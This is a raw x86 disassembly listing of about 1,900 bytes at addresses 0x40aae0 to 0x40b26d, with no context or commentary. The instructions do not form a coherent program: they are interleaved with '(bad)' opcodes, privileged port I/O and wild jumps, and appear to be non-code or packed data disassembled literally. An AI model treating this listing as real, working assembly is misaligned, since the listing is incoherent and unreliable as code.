  40aae0:	sub    cl,BYTE PTR [edi-0x17]
  40aae3:	aad    0xe9
  40aae5:	jl     0x40aaa7
  40aae7:	mov    edi,0xe1311882
  40aaec:	push   ds
  40aaed:	jno    0x40ab2b
  40aaef:	mov    ds:0xd8a56387,eax
  40aaf4:	mov    dl,0xa9
  40aaf6:	adc    ch,BYTE PTR [edx]
  40aaf8:	mov    ebp,0x95cdba1c
  40aafd:	pop    ebp
  40aafe:	bound  edx,QWORD PTR [ebp-0x33]
  40ab01:	jp     0x40ab06
  40ab03:	inc    esp
  40ab04:	sub    bl,dh
  40ab06:	xor    BYTE PTR [ecx],al
  40ab08:	and    BYTE PTR [edi],ah
  40ab0a:	add    cl,BYTE PTR [ebx]
  40ab0c:	push   esp
  40ab0d:	push   ebp
  40ab0e:	dec    esi
  40ab0f:	pusha  
  40ab10:	push   edi
  40ab11:	rcl    cl,cl
  40ab13:	stos   DWORD PTR es:[edi],eax
  40ab14:	dec    ecx
  40ab15:	jecxz  0x40aaf8
  40ab17:	nop
  40ab18:	mov    eax,ds:0x1e3f07f2
  40ab1d:	adc    esp,DWORD PTR [edx]
  40ab1f:	outs   dx,BYTE PTR ds:[esi]
  40ab20:	into   
  40ab21:	imul   BYTE PTR [eax]
  40ab23:	hlt    
  40ab24:	jno    0x40ab33
  40ab26:	retf   
  40ab27:	int    0x76
  40ab29:	std    
  40ab2a:	test   DWORD PTR [edx+0x55],edi
  40ab2d:	das    
  40ab2e:	imul   ebx,DWORD PTR [edi-0x1ea903e5],0x5af4cdf5
  40ab38:	jns    0x40ab16
  40ab3a:	es popf 
  40ab3c:	push   0xc03f64f8
  40ab41:	or     DWORD PTR [eax+0x3],edi
  40ab44:	jne    0x40ab4e
  40ab46:	es jbe 0x40ab6f
  40ab49:	push   0x62
  40ab4b:	setge  BYTE PTR [edi+0x5adf866b]
  40ab52:	inc    esp
  40ab53:	xchg   ch,bl
  40ab55:	push   cs
  40ab56:	fwait
  40ab57:	aad    0x35
  40ab59:	jle    0x40ab0b
  40ab5b:	mov    edi,esi
  40ab5d:	push   edi
  40ab5e:	not    DWORD PTR [eax]
  40ab60:	jb     0x40ab9c
  40ab62:	popa   
  40ab63:	push   cs
  40ab64:	adc    esi,DWORD PTR [eax]
  40ab66:	pop    edi
  40ab67:	rol    DWORD PTR [edi+0x4041e937],1
  40ab6d:	arpl   WORD PTR [ecx],ax
  40ab6f:	xchg   BYTE PTR [ecx-0x3741d050],bl
  40ab75:	xor    eax,0xa4004087
  40ab7a:	dec    ebx
  40ab7b:	call   0x393ba49b
  40ab80:	cmp    eax,0xd9862249
  40ab85:	jp     0x40abc7
  40ab87:	cmp    ecx,ecx
  40ab89:	inc    edx
  40ab8a:	fld    st(6)
  40ab8c:	and    al,0xb7
  40ab8e:	xchg   esi,eax
  40ab8f:	pop    edx
  40ab90:	mov    ebp,0x2a6b7f49
  40ab95:	inc    esp
  40ab96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab97:	inc    ecx
  40ab98:	or     DWORD PTR [edi+0x1],esp
  40ab9b:	ja     0x40ac05
  40ab9d:	cli    
  40ab9e:	cmp    eax,0xa9916d20
  40aba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aba4:	pop    ss
  40aba5:	dec    edi
  40aba6:	fld    DWORD PTR [eax+0x7440cc94]
  40abac:	outs   dx,DWORD PTR ds:[esi]
  40abad:	cmc    
  40abae:	aaa    
  40abaf:	xlat   BYTE PTR ds:[ebx]
  40abb0:	mov    bh,0x5f
  40abb2:	jae    0x40abb3
  40abb4:	mov    cl,0xbc
  40abb6:	mov    al,ds:0xaa58f488
  40abbb:	jl     0x40ab89
  40abbd:	retf   0x3968
  40abc0:	pop    ds
  40abc1:	xor    al,0xb9
  40abc3:	fcomp  QWORD PTR [edi]
  40abc5:	pop    eax
  40abc6:	ficom  DWORD PTR ds:0x77a3d3aa
  40abcc:	xchg   ebx,eax
  40abcd:	test   eax,0x33ead5b3
  40abd2:	loopne 0x40abfb
  40abd4:	xor    esp,edi
  40abd6:	push   0x1061d334
  40abdb:	stc    
  40abdc:	xor    dl,BYTE PTR [eax-0xa]
  40abdf:	add    BYTE PTR [edi],bl
  40abe1:	cmp    DWORD PTR [ecx+0x53],esi
  40abe4:	push   edx
  40abe5:	dec    eax
  40abe6:	push   edx
  40abe7:	pop    eax
  40abe8:	cli    
  40abe9:	aas    
  40abea:	pop    ebx
  40abeb:	inc    edx
  40abec:	rol    BYTE PTR [eax],cl
  40abee:	mov    cl,0x96
  40abf0:	retf   
  40abf1:	mov    edi,DWORD PTR [edi]
  40abf3:	jl     0x40abaa
  40abf5:	das    
  40abf6:	jne    0x40ab81
  40abf8:	xchg   DWORD PTR ds:0xa64b72c1,ebp
  40abfe:	and    DWORD PTR [ebp+0x6a8cdcb8],esp
  40ac04:	jmp    0x40abe5
  40ac06:	cld    
  40ac07:	sub    DWORD PTR [eax-0x71e3bba8],esi
  40ac0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac0e:	adc    BYTE PTR [edx],ch
  40ac10:	dec    ecx
  40ac11:	sbb    DWORD PTR [edx+ecx*2-0x59],ebx
  40ac15:	push   es
  40ac16:	sub    DWORD PTR [ecx+0xd408779],esp
  40ac1c:	ret    0x1b4b
  40ac1f:	mov    cl,0xe
  40ac21:	out    0xda,eax
  40ac23:	inc    eax
  40ac24:	je     0x40abb4
  40ac26:	icebp  
  40ac27:	pushf  
  40ac28:	pop    eax
  40ac29:	pop    ebp
  40ac2a:	xlat   BYTE PTR ds:[ebx]
  40ac2b:	mov    al,0x8b
  40ac2d:	jl     0x40abe0
  40ac2f:	jecxz  0x40ac0b
  40ac31:	mov    ecx,0x788e285
  40ac36:	shl    DWORD PTR [edx+0x6a],cl
  40ac39:	or     eax,0x6f9c7426
  40ac3e:	aaa    
  40ac3f:	mov    ah,0x3e
  40ac41:	mul    DWORD PTR [edi-0x48]
  40ac44:	push   esi
  40ac45:	arpl   WORD PTR [edi+0x6c8f6a7e],sp
  40ac4b:	dec    esi
  40ac4c:	clc    
  40ac4d:	adc    ch,BYTE PTR [edi+0x4ad0975]
  40ac53:	pusha  
  40ac54:	mov    al,0x8d
  40ac56:	xor    eax,0x814320ab
  40ac5b:	jge    0x40ac12
  40ac5d:	stos   DWORD PTR es:[edi],eax
  40ac5e:	(bad)  
  40ac5f:	(bad)  
  40ac60:	push   edx
  40ac61:	inc    ebp
  40ac62:	test   BYTE PTR [edi-0x58d57e2f],0x48
  40ac69:	nop
  40ac6a:	(bad)  
  40ac6b:	fld    st(4)
  40ac6d:	retf   0xd740
  40ac70:	pop    esp
  40ac71:	fimul  DWORD PTR [edx+0x1f245c30]
  40ac77:	ret    
  40ac78:	and    al,0xae
  40ac7a:	lahf   
  40ac7b:	mov    esp,0xc4ee928b
  40ac80:	jp     0x40ac26
  40ac82:	aad    0x7b
  40ac84:	sbb    ah,bl
  40ac86:	bound  ebp,QWORD PTR [eax-0x3d3fb59a]
  40ac8c:	mov    ds:0x11ef00fc,al
  40ac91:	ja     0x40aca0
  40ac93:	mov    BYTE PTR [eax-0x541a0c4],ch
  40ac99:	bound  esp,QWORD PTR [ecx]
  40ac9b:	jmp    0xd794692f
  40aca0:	(bad)
  40aca4:	sbb    al,0xd2
  40aca6:	xchg   ebx,eax
  40aca7:	fnstcw WORD PTR [edi-0x648b66aa]
  40acad:	push   0x3b009b2b
  40acb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acb3:	out    0x6c,al
  40acb5:	fs xchg ebp,eax
  40acb7:	imul   ebx,DWORD PTR [ebx-0x29],0x0
  40acbb:	mov    al,0xdc
  40acbd:	mov    ds:0xc4fc7ca1,eax
  40acc2:	into   
  40acc3:	mov    ebx,0xf22bc139
  40acc8:	cmp    DWORD PTR [eax],0x35
  40accb:	dec    esi
  40accc:	sub    ebx,DWORD PTR [edi+eax*4]
  40accf:	mov    esp,0x2b637499
  40acd4:	mov    dh,0x11
  40acd6:	fs pop ebx
  40acd8:	daa    
  40acd9:	sbb    dh,BYTE PTR [ecx-0x78]
  40acdc:	dec    edx
  40acdd:	mov    eax,0x7f43e283
  40ace2:	sub    ah,0xe1
  40ace5:	cmp    BYTE PTR [ebp+edi*2-0x45],bh
  40ace9:	mov    ds:0x4def773f,al
  40acee:	pop    esp
  40acef:	lods   al,BYTE PTR ds:[esi]
  40acf0:	xchg   ebx,eax
  40acf1:	ins    BYTE PTR es:[edi],dx
  40acf2:	sti    
  40acf3:	adc    bl,dh
  40acf5:	jnp    0x40acd8
  40acf7:	xchg   edi,eax
  40acf8:	ja     0x40ad31
  40acfa:	and    al,BYTE PTR [eax+0x33b015f4]
  40ad00:	mov    esp,0x395609d8
  40ad05:	icebp  
  40ad06:	mov    eax,DWORD PTR [edx]
  40ad08:	retf   0xdfc3
  40ad0b:	mov    cl,0xf7
  40ad0d:	xor    edi,DWORD PTR [esi+0x6b]
  40ad10:	pop    ds
  40ad11:	mov    esp,edx
  40ad13:	and    al,BYTE PTR [ebx+ebx*2]
  40ad16:	mov    eax,0x99243fdd
  40ad1b:	and    BYTE PTR [edi-0x2d],dh
  40ad1e:	inc    ebp
  40ad1f:	pop    edi
  40ad20:	inc    edi
  40ad21:	push   0x56791fa3
  40ad26:	adc    edx,DWORD PTR [esi]
  40ad28:	mov    eax,0xf31ee7c8
  40ad2d:	jle    0x40adae
  40ad2f:	popf   
  40ad30:	mov    BYTE PTR [edx+0x2c95aa5e],ah
  40ad36:	jle    0x40ad0e
  40ad38:	pop    edx
  40ad39:	mov    eax,0xdd337868
  40ad3e:	xchg   ecx,eax
  40ad3f:	out    0x6e,eax
  40ad41:	xchg   esi,eax
  40ad42:	sub    BYTE PTR [ebx+0x26f86190],dl
  40ad48:	jge    0x40ad90
  40ad4a:	mov    ds:0x688a0814,al
  40ad4f:	sbb    BYTE PTR [esi-0x543bf1da],al
  40ad55:	retf   
  40ad56:	mov    DWORD PTR [esi+ecx*1+0x5d9beec6],edi
  40ad5d:	adc    ch,BYTE PTR [ecx+0x5d]
  40ad60:	sbb    eax,0xa35b0207
  40ad65:	and    eax,0xebd82fcc
  40ad6a:	jnp    0x40ad4b
  40ad6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad6e:	imul   ebp,edi,0x3f
  40ad71:	pop    ebx
  40ad72:	bound  ebp,QWORD PTR [eax+ecx*1]
  40ad75:	cmp    eax,0x78ba59be
  40ad7a:	cmp    al,0xe4
  40ad7c:	arpl   WORD PTR [edx],sp
  40ad7e:	mov    ah,0x9f
  40ad80:	inc    esp
  40ad81:	xor    bl,0xf9
  40ad84:	jno    0x40adc0
  40ad86:	retf   0x1e2f
  40ad89:	loopne 0x40ad19
  40ad8b:	mov    ds:0x3731f36f,al
  40ad90:	jmp    0xc4e3e3d1
  40ad95:	add    esi,DWORD PTR [edi]
  40ad97:	cmp    DWORD PTR [esi+edx*1],ebx
  40ad9a:	push   ebx
  40ad9b:	neg    BYTE PTR [eax-0x2c65cca3]
  40ada1:	push   ecx
  40ada2:	pcmpeqw mm4,QWORD PTR [esp+ebx*2]
  40ada6:	or     DWORD PTR [edx+0x1e],edi
  40ada9:	mov    al,ds:0xcb724623
  40adae:	daa    
  40adaf:	pop    esi
  40adb0:	sahf   
  40adb1:	xchg   ecx,eax
  40adb2:	ret    0x2e8c
  40adb5:	dec    ebp
  40adb6:	dec    eax
  40adb7:	jo     0x40ae1d
  40adb9:	pusha  
  40adba:	in     eax,dx
  40adbb:	in     eax,0x9e
  40adbd:	test   eax,0x38e031d3
  40adc2:	aaa    
  40adc3:	pop    ds
  40adc4:	fimul  DWORD PTR [ecx+0x1e]
  40adc7:	ret    0x3af
  40adca:	mov    esp,0x5d69fb14
  40adcf:	jmp    0x40addf
  40add1:	mov    dl,0x41
  40add3:	pop    ds
  40add4:	jae    0x40adc1
  40add6:	jns    0x40ade4
  40add8:	mov    esp,0xb10784da
  40addd:	scas   al,BYTE PTR es:[edi]
  40adde:	mov    esi,0x18f2c9fb
  40ade3:	mov    al,0xc3
  40ade5:	xchg   edi,eax
  40ade6:	cli    
  40ade7:	jne    0x40ade7
  40ade9:	shl    DWORD PTR [esi+0x7],1
  40adec:	cwde   
  40aded:	and    ebp,DWORD PTR ds:0x6ae170c7
  40adf3:	es inc esp
  40adf5:	sub    al,0x14
  40adf7:	stos   DWORD PTR es:[edi],eax
  40adf8:	mov    dh,0x2d
  40adfa:	ds inc esi
  40adfc:	dec    edi
  40adfd:	outs   dx,DWORD PTR ds:[esi]
  40adfe:	lahf   
  40adff:	out    0xcf,eax
  40ae01:	test   al,0x9
  40ae03:	clc    
  40ae04:	mov    ecx,0x67231030
  40ae09:	push   es
  40ae0a:	retf   
  40ae0b:	fwait
  40ae0c:	jns    0x40adc5
  40ae0e:	mov    esp,0xf318261c
  40ae13:	ja     0x40adc7
  40ae15:	aad    0x17
  40ae17:	test   al,0x90
  40ae19:	xor    DWORD PTR [ecx],ecx
  40ae1b:	in     al,dx
  40ae1c:	adc    ecx,DWORD PTR [edi+esi*8-0x3fab0d6e]
  40ae23:	sbb    DWORD PTR [esi+0x4f],eax
  40ae26:	clc    
  40ae27:	outs   dx,BYTE PTR ds:[esi]
  40ae28:	scas   eax,DWORD PTR es:[edi]
  40ae29:	mov    esp,0x5a97188b
  40ae2e:	mov    dh,0xef
  40ae30:	(bad)
  40ae34:	xchg   edx,eax
  40ae35:	dec    esp
  40ae36:	aam    0x9
  40ae38:	push   0xdb1abaa3
  40ae3d:	mov    ebp,0x8d6f60ec
  40ae42:	lock inc edx
  40ae44:	add    BYTE PTR [eax-0x128122c],bh
  40ae4a:	jb     0x40aea8
  40ae4c:	jmp    0x40ae14
  40ae4e:	cs xchg ecx,eax
  40ae50:	jl     0x40ae17
  40ae52:	retf   0xc879
  40ae55:	repz sbb bh,BYTE PTR [eax]
  40ae58:	loop   0x40aeb2
  40ae5a:	(bad)  
  40ae5b:	std    
  40ae5c:	jmp    0x40aea5
  40ae5e:	adc    DWORD PTR ds:0xfd087136,ebx
  40ae64:	ins    BYTE PTR es:[edi],dx
  40ae65:	jns    0x40ae48
  40ae67:	mov    ecx,0xf1e256b1
  40ae6c:	adc    al,0x25
  40ae6e:	(bad)  
  40ae6f:	sar    DWORD PTR [ebx-0x23885949],1
  40ae75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae76:	test   BYTE PTR [edi+0x5b73f644],ah
  40ae7c:	sbb    DWORD PTR [ebp+0x51148b65],ebx
  40ae82:	push   ecx
  40ae83:	pop    ebp
  40ae84:	dec    esi
  40ae85:	mov    ch,0x30
  40ae87:	aad    0x58
  40ae89:	fisttp QWORD PTR [edi]
  40ae8b:	dec    edx
  40ae8c:	sub    DWORD PTR [di],esp
  40ae8f:	jo     0x40aeb9
  40ae91:	xlat   BYTE PTR ds:[ebx]
  40ae92:	and    al,0x1f
  40ae94:	gs push ss
  40ae96:	mov    ah,bh
  40ae98:	add    eax,0x2acd5044
  40ae9d:	repz jmp 0xf584:0xb905b7e
  40aea5:	mov    DWORD PTR [esi+0x3b],edx
  40aea8:	mov    WORD PTR [ebx-0x6f],?
  40aeab:	fmul   DWORD PTR [ecx-0x374ac427]
  40aeb1:	cdq    
  40aeb2:	in     al,0x79
  40aeb4:	jl     0x40aeb8
  40aeb6:	mov    WORD PTR [edi+0x4],?
  40aeb9:	test   DWORD PTR ds:0x6e8863f4,esp
  40aebf:	mov    BYTE PTR [ecx],0x22
  40aec2:	lods   al,BYTE PTR ds:[esi]
  40aec3:	or     al,0x90
  40aec5:	fsub   st,st(3)
  40aec7:	mov    ch,0x68
  40aec9:	lahf   
  40aeca:	sahf   
  40aecb:	dec    ebx
  40aecc:	xchg   ecx,eax
  40aecd:	not    DWORD PTR [ecx+0x69b791af]
  40aed3:	ds push 0xc8958fcd
  40aed9:	loop   0x40aea7
  40aedb:	lahf   
  40aedc:	pop    ss
  40aedd:	cli    
  40aede:	and    ebx,0xffffffc6
  40aee1:	push   0x7b61b4a1
  40aee6:	icebp  
  40aee7:	cmp    bl,bh
  40aee9:	fisttp QWORD PTR [esi+ebp*1+0x7aa424ae]
  40aef0:	cmp    DWORD PTR [edx-0x7fcef8ae],eax
  40aef6:	lea    esp,[edx]
  40aef8:	ss dec ecx
  40aefa:	mov    bh,0x2a
  40aefc:	pop    esi
  40aefd:	ins    BYTE PTR es:[edi],dx
  40aefe:	cmp    al,0x17
  40af00:	or     eax,esi
  40af02:	mov    edx,0x67af4dbb
  40af07:	cmp    cl,BYTE PTR [esi]
  40af09:	adc    BYTE PTR [ecx],0xa6
  40af0c:	cld    
  40af0d:	test   eax,0x93286e7b
  40af12:	aad    0x40
  40af14:	mov    ecx,0xb2db5b86
  40af19:	add    ch,BYTE PTR [edi-0x2a]
  40af1c:	add    bl,BYTE PTR [esi-0x60be982c]
  40af22:	popa   
  40af23:	outs   dx,BYTE PTR ds:[esi]
  40af24:	jnp    0x40af08
  40af26:	adc    ch,BYTE PTR [eax+edi*8+0x70]
  40af2a:	mov    ecx,DWORD PTR [ebx-0x14790c37]
  40af30:	pop    edx
  40af31:	aad    0x65
  40af33:	inc    eax
  40af34:	sbb    BYTE PTR [edx+ecx*2+0x35],dh
  40af38:	ins    BYTE PTR es:[edi],dx
  40af39:	dec    esi
  40af3a:	cwde   
  40af3b:	ja     0x40af1f
  40af3d:	les    edi,FWORD PTR [esi+0x8]
  40af40:	sbb    ebx,DWORD PTR [esi]
  40af42:	jp     0x40af15
  40af44:	and    DWORD PTR [eax],esp
  40af46:	das    
  40af47:	ds fiadd WORD PTR cs:[ebx+0x18]
  40af4c:	xor    edi,DWORD PTR [edi]
  40af4e:	mov    dl,0xd8
  40af50:	ret    0xe86e
  40af53:	adc    BYTE PTR fs:[ecx-0x652bf0e8],dh
  40af5a:	or     ch,BYTE PTR [esi+ecx*2+0x206a69d5]
  40af61:	not    BYTE PTR [ebx-0xd9cd1b8]
  40af67:	outs   dx,BYTE PTR ds:[esi]
  40af68:	xor    al,0xef
  40af6a:	shr    BYTE PTR [esi-0x154f5140],cl
  40af70:	and    eax,0xa5295b7d
  40af75:	push   eax
  40af76:	push   edi
  40af77:	int    0x1e
  40af79:	push   0x7ec7ef26
  40af7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af7f:	or     edx,eax
  40af81:	sub    eax,0x702abe66
  40af86:	popa   
  40af87:	pushf  
  40af88:	jg     0x40af8a
  40af8a:	aam    0xda
  40af8c:	cmp    BYTE PTR [esi+0x6149c951],ch
  40af92:	das    
  40af93:	jmp    0x1f9ada2b
  40af98:	pop    es
  40af99:	clc    
  40af9a:	out    0x10,eax
  40af9c:	call   0x1660:0x66d2295c
  40afa3:	cs aam 0x8a
  40afa6:	lock jo 0x40af30
  40afa9:	mov    DWORD PTR [ebp+0x37bd0826],esp
  40afaf:	inc    esp
  40afb0:	ss pop ds
  40afb2:	fwait
  40afb3:	js     0x40af49
  40afb5:	pushf  
  40afb6:	sbb    ch,dl
  40afb8:	and    bh,ah
  40afba:	sbb    ebx,DWORD PTR [eax-0x5e12a4f6]
  40afc0:	scas   al,BYTE PTR es:[edi]
  40afc1:	xchg   DWORD PTR [ebx-0x5a],esp
  40afc4:	push   edx
  40afc5:	gs iret 
  40afc7:	or     al,al
  40afc9:	push   edi
  40afca:	es sti 
  40afcc:	push   eax
  40afcd:	cwde   
  40afce:	and    eax,0xd5308fd4
  40afd3:	add    eax,0x6be7b794
  40afd8:	lahf   
  40afd9:	fdivr  QWORD PTR [ebx-0x565128cd]
  40afdf:	push   DWORD PTR [edx]
  40afe1:	add    eax,0xa5638648
  40afe6:	lock in al,0x30
  40afe9:	mov    esi,0xb2e26db
  40afee:	mov    ch,0x3
  40aff0:	pop    es
  40aff1:	sub    BYTE PTR [edi+ecx*8-0x23],0xe9
  40aff6:	xor    BYTE PTR [edi],bl
  40aff8:	pop    es
  40aff9:	iret   
  40affa:	push   ebp
  40affb:	test   BYTE PTR [ecx],bh
  40affd:	test   DWORD PTR [edx+0x2840c927],0x7417cd0e
  40b007:	sbb    al,0x4d
  40b009:	adc    ch,BYTE PTR [ebx+0x37029cee]
  40b00f:	add    eax,DWORD PTR [edx+0x44]
  40b012:	sub    eax,0xbfd35977
  40b017:	frstor [ecx]
  40b019:	inc    ecx
  40b01a:	mov    cl,0x3f
  40b01c:	aas    
  40b01d:	mov    ch,0x23
  40b01f:	cdq    
  40b020:	pop    ebp
  40b021:	inc    esi
  40b022:	ret    
  40b023:	pusha  
  40b024:	sub    eax,0x5f8afa2b
  40b029:	mov    edx,0xda356e2d
  40b02e:	repz pop edi
  40b030:	and    al,0x2d
  40b032:	cs push es
  40b034:	jmpw   0xf0bf
  40b038:	iret   
  40b039:	mov    esi,0xc278bfb7
  40b03e:	in     eax,dx
  40b03f:	out    0xce,al
  40b041:	aam    0x42
  40b043:	test   DWORD PTR [edx],0xf6a2f9ff
  40b049:	push   eax
  40b04a:	das    
  40b04b:	ins    BYTE PTR es:[edi],dx
  40b04c:	and    BYTE PTR [esi-0xb],bl
  40b04f:	push   esi
  40b050:	rol    DWORD PTR [edi-0x4b],0x93
  40b054:	cmp    BYTE PTR [ebp+0x5c6788a2],al
  40b05a:	dec    ebx
  40b05b:	jge    0x40b0ac
  40b05d:	push   cs
  40b05e:	popa   
  40b05f:	adc    al,0xe4
  40b061:	cs push esi
  40b063:	sbb    bh,BYTE PTR [eax]
  40b065:	shr    DWORD PTR [ecx],1
  40b067:	dec    ebx
  40b068:	lea    esp,[ecx-0x2807e467]
  40b06e:	ret    
  40b06f:	icebp  
  40b070:	jb     0x40b02e
  40b072:	cmc    
  40b073:	and    BYTE PTR [eax-0x53b1ba65],bl
  40b079:	clc    
  40b07a:	into   
  40b07b:	jg     0x40b0d8
  40b07d:	out    dx,eax
  40b07e:	rol    BYTE PTR [esi+ebp*1+0x53295b6e],1
  40b085:	push   ss
  40b086:	test   edx,esi
  40b088:	jne    0x40b067
  40b08a:	data16 xor bh,BYTE PTR ds:[ebx]
  40b08e:	or     ah,BYTE PTR [eax]
  40b090:	sub    al,0xc8
  40b092:	or     al,0x46
  40b094:	(bad)  
  40b095:	xor    dh,bh
  40b097:	(bad)  
  40b098:	cmp    dl,bh
  40b09a:	mul    DWORD PTR [ecx]
  40b09c:	adc    al,0xdc
  40b09e:	ror    DWORD PTR [ecx+0x78],cl
  40b0a1:	outs   dx,DWORD PTR ds:[esi]
  40b0a2:	dec    esi
  40b0a3:	sbb    al,0xef
  40b0a5:	mov    dh,0x34
  40b0a7:	das    
  40b0a8:	xchg   ebx,eax
  40b0a9:	mov    edx,0x4c55c97f
  40b0ae:	test   al,0x7b
  40b0b0:	mov    esi,0x7e1524c8
  40b0b5:	pop    edx
  40b0b6:	sbb    BYTE PTR [ebp-0x2b70a99d],ch
  40b0bc:	leave  
  40b0bd:	inc    esp
  40b0be:	lea    esi,[esi+0x38346ee7]
  40b0c4:	ja     0x40b078
  40b0c6:	xor    bl,BYTE PTR [esi]
  40b0c8:	mov    eax,0xd59cfbb6
  40b0cd:	adc    al,0xf3
  40b0cf:	mov    ch,0x49
  40b0d1:	inc    edx
  40b0d2:	in     eax,dx
  40b0d3:	loope  0x40b0d8
  40b0d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0d6:	ins    BYTE PTR es:[edi],dx
  40b0d7:	mov    esp,0xfe5971a6
  40b0dc:	add    al,0xce
  40b0de:	push   ebp
  40b0df:	daa    
  40b0e0:	dec    esp
  40b0e1:	imul   esp,esp,0x752d0ff
  40b0e7:	jl     0x40b08a
  40b0e9:	xchg   esp,eax
  40b0ea:	and    BYTE PTR [edx+edx*2],0x58
  40b0ee:	test   al,0xe2
  40b0f0:	icebp  
  40b0f1:	sti    
  40b0f2:	mov    esp,0xf7aa18e0
  40b0f7:	or     eax,0x7fad284d
  40b0fc:	jns    0x40b08c
  40b0fe:	hlt    
  40b0ff:	mov    BYTE PTR [eax-0x47],al
  40b102:	xor    al,0xbc
  40b104:	push   esi
  40b105:	ja     0x40b146
  40b107:	jo     0x40b092
  40b109:	mov    ch,0x20
  40b10b:	scas   al,BYTE PTR es:[edi]
  40b10c:	rdtsc  
  40b10e:	out    dx,al
  40b10f:	or     al,BYTE PTR [eax]
  40b111:	test   BYTE PTR [eax-0x1d],bh
  40b114:	ss jb  0x40b15d
  40b117:	sahf   
  40b118:	shl    esi,0x78
  40b11b:	or     dh,cl
  40b11d:	mov    eax,0x9bfb9b2a
  40b122:	xchg   ebp,eax
  40b123:	cs into 
  40b125:	icebp  
  40b126:	sahf   
  40b127:	sub    DWORD PTR [ebx-0x3e],esi
  40b12a:	enter  0xa3aa,0x2d
  40b12e:	fcomp  st(6)
  40b130:	(bad)  
  40b131:	jmp    0x98223cfb
  40b136:	test   BYTE PTR [ebx+0x65c46dd0],dh
  40b13c:	std    
  40b13d:	jp     0x40b149
  40b13f:	pop    ecx
  40b140:	fistp  DWORD PTR [edi-0x3579e646]
  40b146:	mov    ebp,0x48596c28
  40b14b:	fsubr  DWORD PTR [eax+edx*2]
  40b14e:	and    dh,BYTE PTR [esi+ebx*8]
  40b151:	cmc    
  40b152:	mov    edi,0x25e5fb5a
  40b157:	mov    ch,0xb1
  40b159:	cmp    ebx,ebp
  40b15b:	jecxz  0x40b1be
  40b15d:	push   ds
  40b15e:	and    eax,0xfad71570
  40b163:	pop    ebx
  40b164:	fs mov ah,0xe3
  40b167:	cwde   
  40b168:	add    esp,edi
  40b16a:	out    dx,eax
  40b16b:	push   edi
  40b16c:	data16 sti 
  40b16e:	in     al,0x9c
  40b170:	iret   
  40b171:	add    eax,0xc0ed259e
  40b176:	stos   DWORD PTR es:[edi],eax
  40b177:	retf   
  40b178:	mov    bl,0x4d
  40b17a:	sbb    al,0x36
  40b17c:	bound  eax,QWORD PTR [esi]
  40b17e:	pusha  
  40b17f:	dec    BYTE PTR [ebx-0x632b2c14]
  40b185:	add    eax,0x5ba9e1aa
  40b18a:	or     dl,BYTE PTR [edx+0x70d127ae]
  40b190:	mov    esi,0xa96836b8
  40b195:	test   al,0xd3
  40b197:	mov    esi,0x4aba76f4
  40b19c:	mov    eax,0xecd90b00
  40b1a1:	loopne 0x40b141
  40b1a3:	popa   
  40b1a4:	je     0x40b1d3
  40b1a6:	jp     0x40b183
  40b1a8:	sahf   
  40b1a9:	cmp    BYTE PTR gs:[edi+0x44],cl
  40b1ad:	and    esi,DWORD PTR [ecx-0x5c]
  40b1b0:	cli    
  40b1b1:	push   ebx
  40b1b2:	cli    
  40b1b3:	bound  edi,QWORD PTR [ebx+0x39]
  40b1b6:	ins    BYTE PTR es:[edi],dx
  40b1b7:	mov    eax,ds:0x6ee6f3de
  40b1bc:	lahf   
  40b1bd:	in     al,dx
  40b1be:	daa    
  40b1bf:	aas    
  40b1c0:	push   edi
  40b1c1:	jnp    0x40b1fb
  40b1c3:	mov    dl,0xeb
  40b1c5:	sbb    eax,0xc897927a
  40b1ca:	jbe    0x40b22a
  40b1cc:	int    0xdd
  40b1ce:	enter  0x2ad4,0xd9
  40b1d2:	sub    al,0x42
  40b1d4:	inc    esp
  40b1d5:	push   ebp
  40b1d6:	ss leave 
  40b1d8:	push   ss
  40b1d9:	retf   
  40b1da:	(bad)  
  40b1db:	loop   0x40b199
  40b1dd:	jnp    0x40b174
  40b1df:	mov    ss,esi
  40b1e1:	scas   al,BYTE PTR es:[edi]
  40b1e2:	outs   dx,DWORD PTR ds:[esi]
  40b1e3:	int3   
  40b1e4:	addr16 cwde 
  40b1e6:	sub    edi,DWORD PTR [ecx+0x4d879ff0]
  40b1ec:	add    al,0x40
  40b1ee:	jbe    0x40b1b1
  40b1f0:	jmp    0x40b1fa
  40b1f2:	fs xchg edx,eax
  40b1f4:	or     BYTE PTR [esi+0x3ccc6c5f],0x38
  40b1fb:	mov    WORD PTR [ecx+0x0],ds
  40b1fe:	sbb    DWORD PTR [ebx+ebp*1+0x3ddf3344],0x30
  40b206:	ds inc esp
  40b208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b209:	jle    0x40b23a
  40b20b:	pop    ds
  40b20c:	xchg   BYTE PTR [edx+0x17b29cdf],bl
  40b212:	jl     0x40b272
  40b214:	test   al,0x59
  40b216:	hlt    
  40b217:	add    ebx,DWORD PTR [edi+0x4e826480]
  40b21d:	loop   0x40b20d
  40b21f:	out    0x8f,al
  40b221:	inc    ebx
  40b222:	sub    ebx,DWORD PTR [eax+ebp*1]
  40b225:	mov    eax,0xb60fa82c
  40b22a:	dec    edi
  40b22b:	xor    bl,BYTE PTR [ecx+0x37]
  40b22e:	loope  0x40b1f5
  40b230:	xchg   ebp,eax
  40b231:	in     al,0xc0
  40b233:	xor    BYTE PTR [esi+0x11],dl
  40b236:	sbb    bh,BYTE PTR [edi+ebx*8]
  40b239:	(bad)  
  40b23a:	idiv   BYTE PTR [eax-0x7d413112]
  40b240:	mov    bl,0xf1
  40b242:	xchg   DWORD PTR [esi-0x76],esi
  40b245:	fcom   st(7)
  40b247:	xchg   esi,eax
  40b248:	(bad)
  40b24c:	jne    0x40b233
  40b24e:	and    dl,BYTE PTR [ecx+0x1b]
  40b251:	add    eax,0xcbd0177b
  40b256:	das    
  40b257:	popf   
  40b258:	mov    esp,0x14dbd879
  40b25d:	(bad)  [esi+edi*4]
  40b260:	scas   al,BYTE PTR es:[edi]
  40b261:	(bad)  
  40b263:	mov    cl,0x98
  40b265:	in     al,0x95
  40b267:	rol    DWORD PTR [ebx+0x50a72529],cl
  40b26d:	clc    
